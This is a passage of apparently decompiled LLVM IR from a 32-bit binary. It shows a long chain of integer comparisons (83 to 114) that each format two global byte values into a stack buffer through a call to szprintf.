dec_label_pc_804ae64:                             ; preds = %dec_label_pc_804ae2e, %dec_label_pc_804ae34
  %v13_804ae64 = icmp eq i32 %v2_8049ccc, 83
  %v1_804ae68 = icmp eq i1 %v13_804ae64, false
  br i1 %v1_804ae68, label %dec_label_pc_804ae9a, label %dec_label_pc_804ae6a

dec_label_pc_804ae6a:                             ; preds = %dec_label_pc_804ae64
  %v0_804ae6a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804ae6a = zext i8 %v0_804ae6a to i32
  store i32 %v1_804ae6a, i32* @edx, align 4
  %v0_804ae74 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804ae74 = zext i8 %v0_804ae74 to i32
  %v2_804ae83 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ae95 = call i32 @szprintf(i32 %v2_804ae83, i32 ptrtoint ([14 x i8]* @global_var_8068e4f.125 to i32), i32 %v1_804ae74)
  br label %dec_label_pc_804ae9a

dec_label_pc_804ae9a:                             ; preds = %dec_label_pc_804ae64, %dec_label_pc_804ae6a
  %v13_804ae9a = icmp eq i32 %v2_8049ccc, 84
  %v1_804ae9e = icmp eq i1 %v13_804ae9a, false
  br i1 %v1_804ae9e, label %dec_label_pc_804aed0, label %dec_label_pc_804aea0

dec_label_pc_804aea0:                             ; preds = %dec_label_pc_804ae9a
  %v0_804aea0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aea0 = zext i8 %v0_804aea0 to i32
  store i32 %v1_804aea0, i32* @edx, align 4
  %v0_804aeaa = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aeaa = zext i8 %v0_804aeaa to i32
  %v2_804aeb9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804aecb = call i32 @szprintf(i32 %v2_804aeb9, i32 ptrtoint ([14 x i8]* @global_var_8068e5d.126 to i32), i32 %v1_804aeaa)
  br label %dec_label_pc_804aed0

dec_label_pc_804aed0:                             ; preds = %dec_label_pc_804ae9a, %dec_label_pc_804aea0
  %v13_804aed0 = icmp eq i32 %v2_8049ccc, 85
  %v1_804aed4 = icmp eq i1 %v13_804aed0, false
  br i1 %v1_804aed4, label %dec_label_pc_804af06, label %dec_label_pc_804aed6

dec_label_pc_804aed6:                             ; preds = %dec_label_pc_804aed0
  %v0_804aed6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804aed6 = zext i8 %v0_804aed6 to i32
  store i32 %v1_804aed6, i32* @edx, align 4
  %v0_804aee0 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804aee0 = zext i8 %v0_804aee0 to i32
  %v2_804aeef = ptrtoint i32* %stack_var_-28 to i32
  %v4_804af01 = call i32 @szprintf(i32 %v2_804aeef, i32 ptrtoint ([14 x i8]* @global_var_8068e6b.127 to i32), i32 %v1_804aee0)
  br label %dec_label_pc_804af06

dec_label_pc_804af06:                             ; preds = %dec_label_pc_804aed0, %dec_label_pc_804aed6
  %v13_804af06 = icmp eq i32 %v2_8049ccc, 86
  %v1_804af0a = icmp eq i1 %v13_804af06, false
  br i1 %v1_804af0a, label %dec_label_pc_804af3c, label %dec_label_pc_804af0c

dec_label_pc_804af0c:                             ; preds = %dec_label_pc_804af06
  %v0_804af0c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804af0c = zext i8 %v0_804af0c to i32
  store i32 %v1_804af0c, i32* @edx, align 4
  %v0_804af16 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804af16 = zext i8 %v0_804af16 to i32
  %v2_804af25 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804af37 = call i32 @szprintf(i32 %v2_804af25, i32 ptrtoint ([14 x i8]* @global_var_8068e79.128 to i32), i32 %v1_804af16)
  br label %dec_label_pc_804af3c

dec_label_pc_804af3c:                             ; preds = %dec_label_pc_804af06, %dec_label_pc_804af0c
  %v13_804af3c = icmp eq i32 %v2_8049ccc, 87
  %v1_804af40 = icmp eq i1 %v13_804af3c, false
  br i1 %v1_804af40, label %dec_label_pc_804af72, label %dec_label_pc_804af42

dec_label_pc_804af42:                             ; preds = %dec_label_pc_804af3c
  %v0_804af42 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804af42 = zext i8 %v0_804af42 to i32
  store i32 %v1_804af42, i32* @edx, align 4
  %v0_804af4c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804af4c = zext i8 %v0_804af4c to i32
  %v2_804af5b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804af6d = call i32 @szprintf(i32 %v2_804af5b, i32 ptrtoint ([14 x i8]* @global_var_8068e87.129 to i32), i32 %v1_804af4c)
  br label %dec_label_pc_804af72

dec_label_pc_804af72:                             ; preds = %dec_label_pc_804af3c, %dec_label_pc_804af42
  %v13_804af72 = icmp eq i32 %v2_8049ccc, 88
  %v1_804af76 = icmp eq i1 %v13_804af72, false
  br i1 %v1_804af76, label %dec_label_pc_804afa8, label %dec_label_pc_804af78

dec_label_pc_804af78:                             ; preds = %dec_label_pc_804af72
  %v0_804af78 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804af78 = zext i8 %v0_804af78 to i32
  store i32 %v1_804af78, i32* @edx, align 4
  %v0_804af82 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804af82 = zext i8 %v0_804af82 to i32
  %v2_804af91 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804afa3 = call i32 @szprintf(i32 %v2_804af91, i32 ptrtoint ([14 x i8]* @global_var_8068e95.130 to i32), i32 %v1_804af82)
  br label %dec_label_pc_804afa8

dec_label_pc_804afa8:                             ; preds = %dec_label_pc_804af72, %dec_label_pc_804af78
  %v13_804afa8 = icmp eq i32 %v2_8049ccc, 89
  %v1_804afac = icmp eq i1 %v13_804afa8, false
  br i1 %v1_804afac, label %dec_label_pc_804afde, label %dec_label_pc_804afae

dec_label_pc_804afae:                             ; preds = %dec_label_pc_804afa8
  %v0_804afae = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804afae = zext i8 %v0_804afae to i32
  store i32 %v1_804afae, i32* @edx, align 4
  %v0_804afb8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804afb8 = zext i8 %v0_804afb8 to i32
  %v2_804afc7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804afd9 = call i32 @szprintf(i32 %v2_804afc7, i32 ptrtoint ([14 x i8]* @global_var_8068ea3.131 to i32), i32 %v1_804afb8)
  br label %dec_label_pc_804afde

dec_label_pc_804afde:                             ; preds = %dec_label_pc_804afa8, %dec_label_pc_804afae
  %v13_804afde = icmp eq i32 %v2_8049ccc, 90
  %v1_804afe2 = icmp eq i1 %v13_804afde, false
  br i1 %v1_804afe2, label %dec_label_pc_804b014, label %dec_label_pc_804afe4

dec_label_pc_804afe4:                             ; preds = %dec_label_pc_804afde
  %v0_804afe4 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804afe4 = zext i8 %v0_804afe4 to i32
  store i32 %v1_804afe4, i32* @edx, align 4
  %v0_804afee = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804afee = zext i8 %v0_804afee to i32
  %v2_804affd = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b00f = call i32 @szprintf(i32 %v2_804affd, i32 ptrtoint ([14 x i8]* @global_var_8068eb1.132 to i32), i32 %v1_804afee)
  br label %dec_label_pc_804b014

dec_label_pc_804b014:                             ; preds = %dec_label_pc_804afde, %dec_label_pc_804afe4
  %v13_804b014 = icmp eq i32 %v2_8049ccc, 91
  %v1_804b018 = icmp eq i1 %v13_804b014, false
  br i1 %v1_804b018, label %dec_label_pc_804b04a, label %dec_label_pc_804b01a

dec_label_pc_804b01a:                             ; preds = %dec_label_pc_804b014
  %v0_804b01a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b01a = zext i8 %v0_804b01a to i32
  store i32 %v1_804b01a, i32* @edx, align 4
  %v0_804b024 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b024 = zext i8 %v0_804b024 to i32
  %v2_804b033 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b045 = call i32 @szprintf(i32 %v2_804b033, i32 ptrtoint ([14 x i8]* @global_var_8068ebf.133 to i32), i32 %v1_804b024)
  br label %dec_label_pc_804b04a

dec_label_pc_804b04a:                             ; preds = %dec_label_pc_804b014, %dec_label_pc_804b01a
  %v13_804b04a = icmp eq i32 %v2_8049ccc, 92
  %v1_804b04e = icmp eq i1 %v13_804b04a, false
  br i1 %v1_804b04e, label %dec_label_pc_804b080, label %dec_label_pc_804b050

dec_label_pc_804b050:                             ; preds = %dec_label_pc_804b04a
  %v0_804b050 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b050 = zext i8 %v0_804b050 to i32
  store i32 %v1_804b050, i32* @edx, align 4
  %v0_804b05a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b05a = zext i8 %v0_804b05a to i32
  %v2_804b069 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b07b = call i32 @szprintf(i32 %v2_804b069, i32 ptrtoint ([14 x i8]* @global_var_8068ecd.134 to i32), i32 %v1_804b05a)
  br label %dec_label_pc_804b080

dec_label_pc_804b080:                             ; preds = %dec_label_pc_804b04a, %dec_label_pc_804b050
  %v13_804b080 = icmp eq i32 %v2_8049ccc, 93
  %v1_804b084 = icmp eq i1 %v13_804b080, false
  br i1 %v1_804b084, label %dec_label_pc_804b0b6, label %dec_label_pc_804b086

dec_label_pc_804b086:                             ; preds = %dec_label_pc_804b080
  %v0_804b086 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b086 = zext i8 %v0_804b086 to i32
  store i32 %v1_804b086, i32* @edx, align 4
  %v0_804b090 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b090 = zext i8 %v0_804b090 to i32
  %v2_804b09f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b0b1 = call i32 @szprintf(i32 %v2_804b09f, i32 ptrtoint ([14 x i8]* @global_var_8068edb.135 to i32), i32 %v1_804b090)
  br label %dec_label_pc_804b0b6

dec_label_pc_804b0b6:                             ; preds = %dec_label_pc_804b080, %dec_label_pc_804b086
  %v13_804b0b6 = icmp eq i32 %v2_8049ccc, 94
  %v1_804b0ba = icmp eq i1 %v13_804b0b6, false
  br i1 %v1_804b0ba, label %dec_label_pc_804b0ec, label %dec_label_pc_804b0bc

dec_label_pc_804b0bc:                             ; preds = %dec_label_pc_804b0b6
  %v0_804b0bc = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b0bc = zext i8 %v0_804b0bc to i32
  store i32 %v1_804b0bc, i32* @edx, align 4
  %v0_804b0c6 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b0c6 = zext i8 %v0_804b0c6 to i32
  %v2_804b0d5 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b0e7 = call i32 @szprintf(i32 %v2_804b0d5, i32 ptrtoint ([14 x i8]* @global_var_8068ee9.136 to i32), i32 %v1_804b0c6)
  br label %dec_label_pc_804b0ec

dec_label_pc_804b0ec:                             ; preds = %dec_label_pc_804b0b6, %dec_label_pc_804b0bc
  %v13_804b0ec = icmp eq i32 %v2_8049ccc, 95
  %v1_804b0f0 = icmp eq i1 %v13_804b0ec, false
  br i1 %v1_804b0f0, label %dec_label_pc_804b122, label %dec_label_pc_804b0f2

dec_label_pc_804b0f2:                             ; preds = %dec_label_pc_804b0ec
  %v0_804b0f2 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b0f2 = zext i8 %v0_804b0f2 to i32
  store i32 %v1_804b0f2, i32* @edx, align 4
  %v0_804b0fc = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b0fc = zext i8 %v0_804b0fc to i32
  %v2_804b10b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b11d = call i32 @szprintf(i32 %v2_804b10b, i32 ptrtoint ([14 x i8]* @global_var_8068ef7.137 to i32), i32 %v1_804b0fc)
  br label %dec_label_pc_804b122

dec_label_pc_804b122:                             ; preds = %dec_label_pc_804b0ec, %dec_label_pc_804b0f2
  %v10_804b122 = icmp eq i32 %v2_8049ccc, 96
  %v1_804b126 = icmp eq i1 %v10_804b122, false
  br i1 %v1_804b126, label %dec_label_pc_804b158, label %dec_label_pc_804b128

dec_label_pc_804b128:                             ; preds = %dec_label_pc_804b122
  %v0_804b128 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b128 = zext i8 %v0_804b128 to i32
  store i32 %v1_804b128, i32* @edx, align 4
  %v0_804b132 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b132 = zext i8 %v0_804b132 to i32
  %v2_804b141 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b153 = call i32 @szprintf(i32 %v2_804b141, i32 ptrtoint ([14 x i8]* @global_var_8068f05.138 to i32), i32 %v1_804b132)
  br label %dec_label_pc_804b158

dec_label_pc_804b158:                             ; preds = %dec_label_pc_804b122, %dec_label_pc_804b128
  %v13_804b158 = icmp eq i32 %v2_8049ccc, 97
  %v1_804b15c = icmp eq i1 %v13_804b158, false
  br i1 %v1_804b15c, label %dec_label_pc_804b18e, label %dec_label_pc_804b15e

dec_label_pc_804b15e:                             ; preds = %dec_label_pc_804b158
  %v0_804b15e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b15e = zext i8 %v0_804b15e to i32
  store i32 %v1_804b15e, i32* @edx, align 4
  %v0_804b168 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b168 = zext i8 %v0_804b168 to i32
  %v2_804b177 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b189 = call i32 @szprintf(i32 %v2_804b177, i32 ptrtoint ([13 x i8]* @global_var_8068f13.139 to i32), i32 %v1_804b168)
  br label %dec_label_pc_804b18e

dec_label_pc_804b18e:                             ; preds = %dec_label_pc_804b158, %dec_label_pc_804b15e
  %v13_804b18e = icmp eq i32 %v2_8049ccc, 98
  %v1_804b192 = icmp eq i1 %v13_804b18e, false
  br i1 %v1_804b192, label %dec_label_pc_804b1c4, label %dec_label_pc_804b194

dec_label_pc_804b194:                             ; preds = %dec_label_pc_804b18e
  %v0_804b194 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b194 = zext i8 %v0_804b194 to i32
  store i32 %v1_804b194, i32* @edx, align 4
  %v0_804b19e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b19e = zext i8 %v0_804b19e to i32
  %v2_804b1ad = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b1bf = call i32 @szprintf(i32 %v2_804b1ad, i32 ptrtoint ([13 x i8]* @global_var_8068f20.140 to i32), i32 %v1_804b19e)
  br label %dec_label_pc_804b1c4

dec_label_pc_804b1c4:                             ; preds = %dec_label_pc_804b18e, %dec_label_pc_804b194
  %v13_804b1c4 = icmp eq i32 %v2_8049ccc, 99
  %v1_804b1c8 = icmp eq i1 %v13_804b1c4, false
  br i1 %v1_804b1c8, label %dec_label_pc_804b1fa, label %dec_label_pc_804b1ca

dec_label_pc_804b1ca:                             ; preds = %dec_label_pc_804b1c4
  %v0_804b1ca = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b1ca = zext i8 %v0_804b1ca to i32
  store i32 %v1_804b1ca, i32* @edx, align 4
  %v0_804b1d4 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b1d4 = zext i8 %v0_804b1d4 to i32
  %v2_804b1e3 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b1f5 = call i32 @szprintf(i32 %v2_804b1e3, i32 ptrtoint ([14 x i8]* @global_var_8068f2d.141 to i32), i32 %v1_804b1d4)
  br label %dec_label_pc_804b1fa

dec_label_pc_804b1fa:                             ; preds = %dec_label_pc_804b1c4, %dec_label_pc_804b1ca
  %v13_804b1fa = icmp eq i32 %v2_8049ccc, 100
  %v1_804b1fe = icmp eq i1 %v13_804b1fa, false
  br i1 %v1_804b1fe, label %dec_label_pc_804b230, label %dec_label_pc_804b200

dec_label_pc_804b200:                             ; preds = %dec_label_pc_804b1fa
  %v0_804b200 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b200 = zext i8 %v0_804b200 to i32
  store i32 %v1_804b200, i32* @edx, align 4
  %v0_804b20a = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b20a = zext i8 %v0_804b20a to i32
  %v2_804b219 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b22b = call i32 @szprintf(i32 %v2_804b219, i32 ptrtoint ([14 x i8]* @global_var_8068f3b.142 to i32), i32 %v1_804b20a)
  br label %dec_label_pc_804b230

dec_label_pc_804b230:                             ; preds = %dec_label_pc_804b1fa, %dec_label_pc_804b200
  %v13_804b230 = icmp eq i32 %v2_8049ccc, 101
  %v1_804b234 = icmp eq i1 %v13_804b230, false
  br i1 %v1_804b234, label %dec_label_pc_804b266, label %dec_label_pc_804b236

dec_label_pc_804b236:                             ; preds = %dec_label_pc_804b230
  %v0_804b236 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b236 = zext i8 %v0_804b236 to i32
  store i32 %v1_804b236, i32* @edx, align 4
  %v0_804b240 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b240 = zext i8 %v0_804b240 to i32
  %v2_804b24f = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b261 = call i32 @szprintf(i32 %v2_804b24f, i32 ptrtoint ([14 x i8]* @global_var_8068f49.143 to i32), i32 %v1_804b240)
  br label %dec_label_pc_804b266

dec_label_pc_804b266:                             ; preds = %dec_label_pc_804b230, %dec_label_pc_804b236
  %v13_804b266 = icmp eq i32 %v2_8049ccc, 102
  %v1_804b26a = icmp eq i1 %v13_804b266, false
  br i1 %v1_804b26a, label %dec_label_pc_804b29c, label %dec_label_pc_804b26c

dec_label_pc_804b26c:                             ; preds = %dec_label_pc_804b266
  %v0_804b26c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b26c = zext i8 %v0_804b26c to i32
  store i32 %v1_804b26c, i32* @edx, align 4
  %v0_804b276 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b276 = zext i8 %v0_804b276 to i32
  %v2_804b285 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b297 = call i32 @szprintf(i32 %v2_804b285, i32 ptrtoint ([14 x i8]* @global_var_8068f57.144 to i32), i32 %v1_804b276)
  br label %dec_label_pc_804b29c

dec_label_pc_804b29c:                             ; preds = %dec_label_pc_804b266, %dec_label_pc_804b26c
  %v13_804b29c = icmp eq i32 %v2_8049ccc, 103
  %v1_804b2a0 = icmp eq i1 %v13_804b29c, false
  br i1 %v1_804b2a0, label %dec_label_pc_804b2d2, label %dec_label_pc_804b2a2

dec_label_pc_804b2a2:                             ; preds = %dec_label_pc_804b29c
  %v0_804b2a2 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b2a2 = zext i8 %v0_804b2a2 to i32
  store i32 %v1_804b2a2, i32* @edx, align 4
  %v0_804b2ac = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b2ac = zext i8 %v0_804b2ac to i32
  %v2_804b2bb = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b2cd = call i32 @szprintf(i32 %v2_804b2bb, i32 ptrtoint ([14 x i8]* @global_var_8068f65.145 to i32), i32 %v1_804b2ac)
  br label %dec_label_pc_804b2d2

dec_label_pc_804b2d2:                             ; preds = %dec_label_pc_804b29c, %dec_label_pc_804b2a2
  %v13_804b2d2 = icmp eq i32 %v2_8049ccc, 104
  %v1_804b2d6 = icmp eq i1 %v13_804b2d2, false
  br i1 %v1_804b2d6, label %dec_label_pc_804b308, label %dec_label_pc_804b2d8

dec_label_pc_804b2d8:                             ; preds = %dec_label_pc_804b2d2
  %v0_804b2d8 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b2d8 = zext i8 %v0_804b2d8 to i32
  store i32 %v1_804b2d8, i32* @edx, align 4
  %v0_804b2e2 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b2e2 = zext i8 %v0_804b2e2 to i32
  %v2_804b2f1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b303 = call i32 @szprintf(i32 %v2_804b2f1, i32 ptrtoint ([14 x i8]* @global_var_8068f73.146 to i32), i32 %v1_804b2e2)
  br label %dec_label_pc_804b308

dec_label_pc_804b308:                             ; preds = %dec_label_pc_804b2d2, %dec_label_pc_804b2d8
  %v13_804b308 = icmp eq i32 %v2_8049ccc, 105
  %v1_804b30c = icmp eq i1 %v13_804b308, false
  br i1 %v1_804b30c, label %dec_label_pc_804b33e, label %dec_label_pc_804b30e

dec_label_pc_804b30e:                             ; preds = %dec_label_pc_804b308
  %v0_804b30e = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b30e = zext i8 %v0_804b30e to i32
  store i32 %v1_804b30e, i32* @edx, align 4
  %v0_804b318 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b318 = zext i8 %v0_804b318 to i32
  %v2_804b327 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b339 = call i32 @szprintf(i32 %v2_804b327, i32 ptrtoint ([14 x i8]* @global_var_8068f81.147 to i32), i32 %v1_804b318)
  br label %dec_label_pc_804b33e

dec_label_pc_804b33e:                             ; preds = %dec_label_pc_804b308, %dec_label_pc_804b30e
  %v13_804b33e = icmp eq i32 %v2_8049ccc, 106
  %v1_804b342 = icmp eq i1 %v13_804b33e, false
  br i1 %v1_804b342, label %dec_label_pc_804b374, label %dec_label_pc_804b344

dec_label_pc_804b344:                             ; preds = %dec_label_pc_804b33e
  %v0_804b344 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b344 = zext i8 %v0_804b344 to i32
  store i32 %v1_804b344, i32* @edx, align 4
  %v0_804b34e = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b34e = zext i8 %v0_804b34e to i32
  %v2_804b35d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b36f = call i32 @szprintf(i32 %v2_804b35d, i32 ptrtoint ([14 x i8]* @global_var_8068f8f.148 to i32), i32 %v1_804b34e)
  br label %dec_label_pc_804b374

dec_label_pc_804b374:                             ; preds = %dec_label_pc_804b33e, %dec_label_pc_804b344
  %v13_804b374 = icmp eq i32 %v2_8049ccc, 107
  %v1_804b378 = icmp eq i1 %v13_804b374, false
  br i1 %v1_804b378, label %dec_label_pc_804b3aa, label %dec_label_pc_804b37a

dec_label_pc_804b37a:                             ; preds = %dec_label_pc_804b374
  %v0_804b37a = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b37a = zext i8 %v0_804b37a to i32
  store i32 %v1_804b37a, i32* @edx, align 4
  %v0_804b384 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b384 = zext i8 %v0_804b384 to i32
  %v2_804b393 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b3a5 = call i32 @szprintf(i32 %v2_804b393, i32 ptrtoint ([13 x i8]* @global_var_8068f9d.149 to i32), i32 %v1_804b384)
  br label %dec_label_pc_804b3aa

dec_label_pc_804b3aa:                             ; preds = %dec_label_pc_804b374, %dec_label_pc_804b37a
  %v13_804b3aa = icmp eq i32 %v2_8049ccc, 108
  %v1_804b3ae = icmp eq i1 %v13_804b3aa, false
  br i1 %v1_804b3ae, label %dec_label_pc_804b3e0, label %dec_label_pc_804b3b0

dec_label_pc_804b3b0:                             ; preds = %dec_label_pc_804b3aa
  %v0_804b3b0 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b3b0 = zext i8 %v0_804b3b0 to i32
  store i32 %v1_804b3b0, i32* @edx, align 4
  %v0_804b3ba = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b3ba = zext i8 %v0_804b3ba to i32
  %v2_804b3c9 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b3db = call i32 @szprintf(i32 %v2_804b3c9, i32 ptrtoint ([12 x i8]* @global_var_8068faa.150 to i32), i32 %v1_804b3ba)
  br label %dec_label_pc_804b3e0

dec_label_pc_804b3e0:                             ; preds = %dec_label_pc_804b3aa, %dec_label_pc_804b3b0
  %v13_804b3e0 = icmp eq i32 %v2_8049ccc, 109
  %v1_804b3e4 = icmp eq i1 %v13_804b3e0, false
  br i1 %v1_804b3e4, label %dec_label_pc_804b416, label %dec_label_pc_804b3e6

dec_label_pc_804b3e6:                             ; preds = %dec_label_pc_804b3e0
  %v0_804b3e6 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b3e6 = zext i8 %v0_804b3e6 to i32
  store i32 %v1_804b3e6, i32* @edx, align 4
  %v0_804b3f0 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b3f0 = zext i8 %v0_804b3f0 to i32
  %v2_804b3ff = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b411 = call i32 @szprintf(i32 %v2_804b3ff, i32 ptrtoint ([14 x i8]* @global_var_8068fb6.151 to i32), i32 %v1_804b3f0)
  br label %dec_label_pc_804b416

dec_label_pc_804b416:                             ; preds = %dec_label_pc_804b3e0, %dec_label_pc_804b3e6
  %v13_804b416 = icmp eq i32 %v2_8049ccc, 110
  %v1_804b41a = icmp eq i1 %v13_804b416, false
  br i1 %v1_804b41a, label %dec_label_pc_804b44c, label %dec_label_pc_804b41c

dec_label_pc_804b41c:                             ; preds = %dec_label_pc_804b416
  %v0_804b41c = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b41c = zext i8 %v0_804b41c to i32
  store i32 %v1_804b41c, i32* @edx, align 4
  %v0_804b426 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b426 = zext i8 %v0_804b426 to i32
  %v2_804b435 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b447 = call i32 @szprintf(i32 %v2_804b435, i32 ptrtoint ([14 x i8]* @global_var_8068fc4.152 to i32), i32 %v1_804b426)
  br label %dec_label_pc_804b44c

dec_label_pc_804b44c:                             ; preds = %dec_label_pc_804b416, %dec_label_pc_804b41c
  %v13_804b44c = icmp eq i32 %v2_8049ccc, 111
  %v1_804b450 = icmp eq i1 %v13_804b44c, false
  br i1 %v1_804b450, label %dec_label_pc_804b482, label %dec_label_pc_804b452

dec_label_pc_804b452:                             ; preds = %dec_label_pc_804b44c
  %v0_804b452 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b452 = zext i8 %v0_804b452 to i32
  store i32 %v1_804b452, i32* @edx, align 4
  %v0_804b45c = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b45c = zext i8 %v0_804b45c to i32
  %v2_804b46b = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b47d = call i32 @szprintf(i32 %v2_804b46b, i32 ptrtoint ([14 x i8]* @global_var_8068fd2.153 to i32), i32 %v1_804b45c)
  br label %dec_label_pc_804b482

dec_label_pc_804b482:                             ; preds = %dec_label_pc_804b44c, %dec_label_pc_804b452
  %v10_804b482 = icmp eq i32 %v2_8049ccc, 112
  %v1_804b486 = icmp eq i1 %v10_804b482, false
  br i1 %v1_804b486, label %dec_label_pc_804b4b8, label %dec_label_pc_804b488

dec_label_pc_804b488:                             ; preds = %dec_label_pc_804b482
  %v0_804b488 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b488 = zext i8 %v0_804b488 to i32
  store i32 %v1_804b488, i32* @edx, align 4
  %v0_804b492 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b492 = zext i8 %v0_804b492 to i32
  %v2_804b4a1 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b4b3 = call i32 @szprintf(i32 %v2_804b4a1, i32 ptrtoint ([14 x i8]* @global_var_8068fe0.154 to i32), i32 %v1_804b492)
  br label %dec_label_pc_804b4b8

dec_label_pc_804b4b8:                             ; preds = %dec_label_pc_804b482, %dec_label_pc_804b488
  %v13_804b4b8 = icmp eq i32 %v2_8049ccc, 113
  %v1_804b4bc = icmp eq i1 %v13_804b4b8, false
  br i1 %v1_804b4bc, label %dec_label_pc_804b4ee, label %dec_label_pc_804b4be

dec_label_pc_804b4be:                             ; preds = %dec_label_pc_804b4b8
  %v0_804b4be = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b4be = zext i8 %v0_804b4be to i32
  store i32 %v1_804b4be, i32* @edx, align 4
  %v0_804b4c8 = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b4c8 = zext i8 %v0_804b4c8 to i32
  %v2_804b4d7 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b4e9 = call i32 @szprintf(i32 %v2_804b4d7, i32 ptrtoint ([14 x i8]* @global_var_8068fee.155 to i32), i32 %v1_804b4c8)
  br label %dec_label_pc_804b4ee

dec_label_pc_804b4ee:                             ; preds = %dec_label_pc_804b4b8, %dec_label_pc_804b4be
  %v13_804b4ee = icmp eq i32 %v2_8049ccc, 114
  %v1_804b4f2 = icmp eq i1 %v13_804b4ee, false
  br i1 %v1_804b4f2, label %dec_label_pc_804b524, label %dec_label_pc_804b4f4

dec_label_pc_804b4f4:                             ; preds = %dec_label_pc_804b4ee
  %v0_804b4f4 = load i8, i8* @global_var_8071b59.40, align 1
  %v1_804b4f4 = zext i8 %v0_804b4f4 to i32
  store i32 %v1_804b4f4, i32* @edx, align 4
  %v0_804b4fe = load i8, i8* @global_var_8071b58.39, align 8
  %v1_804b4fe = zext i8 %v0_804b4fe to i32
  %v2_804b50d = ptrtoint i32* %stack_var_-28 to i32
  %v4_804b51f = call i32 @szprintf(i32 %v2_804b50d, i32 ptrtoint ([14 x i8]* @global_var_8068ffc.156 to i32), i32 %v1_804b4fe)
  br label %dec_label_pc_804b524

dec_label_pc_804b524:                             ; preds = %dec_label_pc_804b4ee, %dec_label_pc_804b4f4
  br i1 true, label %dec_label_pc_804b55a, label %dec_label_pc_804b52a

dec_label_pc_804b52a:                             ; preds = %dec_label_pc_804b524
  br label %dec_label_pc_804b55a

